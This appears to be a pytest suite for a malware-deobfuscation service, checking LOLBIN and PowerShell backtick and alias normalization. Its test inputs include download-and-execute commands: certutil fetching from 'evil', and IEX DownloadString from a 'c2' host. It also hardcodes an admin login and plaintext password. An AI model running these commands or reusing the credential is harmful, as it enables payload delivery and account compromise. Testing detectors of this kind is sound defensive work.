"""Iteration-26 verification tests: RC4.4 LOLBIN fix + RC4.5 backtick/alias normalizers.
Adds coverage on top of test_rc4_verification.py.
"""
import os
import re
import json
import pytest
import requests

BASE_URL = (os.environ.get("REACT_APP_BACKEND_URL") or "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def headers():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=90)
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text}"
    return {"Authorization": f"Bearer {r.json()['access_token']}", "Content-Type": "application/json"}


def smart_decode(headers, payload):
    r = requests.post(f"{BASE_URL}/api/decode/smart",
                      json={"input": payload}, headers=headers, timeout=90)
    assert r.status_code == 200, f"smart decode failed: {r.status_code} {r.text[:500]}"
    return r.json()


# ============= P0-FEAT-6: LOLBIN full spec (top-level mitre + RC4.4 banner) =============
def test_p0_feat_6_lolbin_certutil_full(headers):
    payload = "cmd /c certutil.exe -urlcache -f http://evil/x.exe C:\\a.exe"
    data = smart_decode(headers, payload)

    # cmd_runtime_reconstruct block
    crr = data.get("cmd_runtime_reconstruct")
    assert crr, f"cmd_runtime_reconstruct missing. keys={list(data.keys())}"
    verdict = crr.get("verdict") or {}
    v_val = verdict.get("verdict") if isinstance(verdict, dict) else verdict
    category = verdict.get("category") if isinstance(verdict, dict) else None
    assert v_val == "malicious", f"verdict != malicious: {verdict}"
    assert category == "lolbin-execution", f"category != lolbin-execution: {category}"

    # Top-level mitre MUST contain T1218
    top_mitre = data.get("mitre") or []
    top_mitre_str = str(top_mitre)
    assert "T1218" in top_mitre_str, f"T1218 not in top-level mitre: {top_mitre}"

    # output_raw MUST contain RC4.4 banner
    output_raw = data.get("output_raw", "") or ""
    assert "CMD RUNTIME RECONSTRUCTION (RC4.4" in output_raw, \
        f"RC4.4 banner missing. output_raw head: {output_raw[:500]}"


# ============= P1-FEAT-9: Backtick normalizer =============
def test_p1_feat_9_backtick_iex_downloadstring(headers):
    # I`E`X (New-`Object Net.`WebClient).DownloadString(...)
    payload = "I`E`X (New-`Object Net.`WebClient).DownloadString('http://c2/s.ps1')"
    data = smart_decode(headers, payload)
    recipe = data.get("recipe", [])
    output_raw = data.get("output_raw", "") or ""
    assert any("powershell-backtick-normalize" in str(r) for r in recipe), \
        f"powershell-backtick-normalize missing in recipe: {recipe}"
    assert "POWERSHELL BACKTICK NORMALIZATION (RC4.5" in output_raw, \
        f"RC4.5 backtick banner missing. output_raw head: {output_raw[:500]}"
    assert "IEX (New-Object Net.WebClient).DownloadString" in output_raw, \
        f"reconstructed IEX form missing. output_raw head: {output_raw[:500]}"


def test_p1_feat_9_backtick_line_continuation(headers):
    payload = "powershell `\n  -NoProfile `\n  -Command 'x'"
    data = smart_decode(headers, payload)
    output_raw = data.get("output_raw", "") or ""
    assert "powershell -NoProfile -Command 'x'" in output_raw, \
        f"line-continuation collapse missing. output_raw head: {output_raw[:600]}"


def test_p1_feat_9_backtick_preserves_escape(headers):
    payload = '"line1`n line2"'
    data = smart_decode(headers, payload)
    output_raw = data.get("output_raw", "") or ""
    # The backtick-n newline escape MUST NOT be stripped
    assert "`n" in output_raw, f"`n escape got stripped incorrectly. output_raw head: {output_raw[:400]}"


# ============= P1-FEAT-10: Alias normalizer =============
def test_p1_feat_10_alias_iex_iwr(headers):
    payload = "powershell -NoProfile -Command \"iex (iwr 'http://c2/s.ps1')\""
    data = smart_decode(headers, payload)
    recipe = data.get("recipe", [])
    output_raw = data.get("output_raw", "") or ""
    assert any("powershell-alias-normalize" in str(r) for r in recipe), \
        f"powershell-alias-normalize missing in recipe: {recipe}"
    assert "POWERSHELL ALIAS NORMALIZATION (RC4.5" in output_raw, \
        f"RC4.5 alias banner missing. output_raw head: {output_raw[:500]}"
    assert "Invoke-Expression (Invoke-WebRequest" in output_raw, \
        f"expanded aliases missing. output_raw head: {output_raw[:500]}"


def test_p1_feat_10_alias_preserves_single_quoted_literal(headers):
    payload = "powershell -Command \"Write-Host 'use iex to invoke'\""
    data = smart_decode(headers, payload)
    output_raw = data.get("output_raw", "") or ""
    # Single-quoted literal 'use iex to invoke' must remain untouched
    assert "'use iex to invoke'" in output_raw, \
        f"single-quoted literal was mutated. output_raw head: {output_raw[:500]}"


# ============= P0-REG-8: registry has 10 required ops incl RC4.5 =============
def test_p0_reg_8_ops_with_rc45(headers):
    r = requests.get(f"{BASE_URL}/api/operations", headers=headers, timeout=30)
    if r.status_code == 405:
        r = requests.post(f"{BASE_URL}/api/operations", headers=headers, timeout=30)
    assert r.status_code == 200, f"{r.status_code} {r.text[:400]}"
    ops_str = json.dumps(r.json()).lower()
    required = [
        "cmd-runtime-reconstruct",
        "powershell-backtick-normalize",
        "powershell-alias-normalize",
        "powershell-normalize",
        "powershell-semantic-mini",
        "batch-envvar-substitute",
        "cmd-envvar-substring-picker",
        "crypto-api-annotator",
        "rc4-inline-decrypt",
        "powershell-hex-csv-inline",
    ]
    missing = [op for op in required if op not in ops_str]
    assert not missing, f"missing operations: {missing}"


# ============= P0-REG-9: base64 baseline =============
def test_p0_reg_9_base64(headers):
    data = smart_decode(headers, "SGVsbG8gV29ybGQh")
    assert "Hello World!" in (data.get("output_raw") or ""), \
        f"base64 decode broken: {data.get('output_raw', '')[:300]}"


# ============= P0-REG-10: 61 plugins loaded =============
def test_p0_reg_10_registry_count():
    with open("/var/log/supervisor/backend.err.log", "r") as f:
        log = f.read()
    lines = [l for l in log.splitlines() if "Decoder registry ready" in l]
    assert lines, "Decoder registry ready line missing"
    m = re.search(r"(\d+)\s+plugins loaded", lines[-1])
    assert m, f"could not parse plugin count: {lines[-1]}"
    count = int(m.group(1))
    assert count >= 61, f"plugin count < 61: got {count} (line: {lines[-1]})"


# ============= P0-BUG-1 regression: powershell-normalize (comma-sep) =============
def test_p0_bug_1_powershell_normalize_regression(headers):
    payload = "PoWeRsHeLl.eXe,-NoPrOfIlE,-ExEcUtIoNpOlIcY,ByPaSs,-CoMmAnD,\"Write-Host '[+] Mixed Case Test'\""
    data = smart_decode(headers, payload)
    recipe = data.get("recipe", [])
    output_raw = data.get("output_raw", "") or ""
    assert any("powershell-normalize" in str(r) for r in recipe), \
        f"powershell-normalize missing: {recipe}"
    assert "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command" in output_raw, \
        f"canonicalized form missing: {output_raw[:500]}"


# ============= P0-BUG-3 regression: honesty_linter partial =============
def test_p0_bug_3_honesty_linter_regression(headers):
    payload = "cmd /c %UNKNOWNVAR:~0,1%.exe && echo SGVsbG8gV29ybGQh | base64 -d"
    data = smart_decode(headers, payload)
    blob = json.dumps(data)
    verdict_card = data.get("verdict_card") or {}
    v = verdict_card.get("verdict") if isinstance(verdict_card, dict) else None
    ok = (v and ("partial" in str(v).lower())) or ("partial-reconstruction" in blob) or ("\"Partial\"" in blob)
    assert ok, f"expected Partial verdict; verdict_card={verdict_card}"


# ============= P0-FEAT-5 regression: RC4.4 calc.exe =============
def test_p0_feat_5_calc_regression(headers):
    payload = "cmd.exe /c %SystemRoot:~0,1%%ProgramFiles:~8,1%%PUBLIC:~-3,1%%SystemRoot:~0,1%.exe"
    data = smart_decode(headers, payload)
    crr = data.get("cmd_runtime_reconstruct")
    assert crr, f"cmd_runtime_reconstruct missing. keys={list(data.keys())}"
    assert crr.get("expected_child") == "calc.exe", f"expected_child mismatch: {crr.get('expected_child')}"
    trace = crr.get("character_trace") or []
    chars = [(t.get("character") or t.get("char")) if isinstance(t, dict) else t for t in trace]
    assert chars == ["C", "a", "l", "C"], f"chars mismatch: {chars}"
    verdict = crr.get("verdict") or {}
    v_val = verdict.get("verdict") if isinstance(verdict, dict) else verdict
    assert v_val == "benign-demonstration", f"verdict mismatch: {verdict}"
